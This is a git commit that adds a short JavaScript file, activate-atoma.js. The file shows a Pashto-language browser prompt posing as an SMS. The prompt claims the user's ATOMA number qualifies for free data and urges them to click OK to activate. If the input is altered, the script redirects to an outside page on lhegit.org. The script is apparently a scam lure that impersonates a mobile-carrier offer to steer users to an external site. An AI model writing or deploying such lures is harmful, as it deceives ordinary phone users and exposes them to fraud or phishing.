5e2da2970d113f3b5606116ff97de4da64eabf6b
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-14 09:29:19 +0100

    Create activate-atoma.js

---
+++ activate-atoma.js
@@ -0,0 +1,5 @@
+var password = 'همدا اوس فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو د ATOMA شمیره د وړیا معلوماتو ترلاسه کولو وړ ده، اوس د فعالولو لپاره په OK کلیک وکړئ.','همدا اوس فعال کړئ');
+if (password != 'همدا اوس فعال کړئ') {
+location.href='https://lhegit.org/atoma.html';
+}
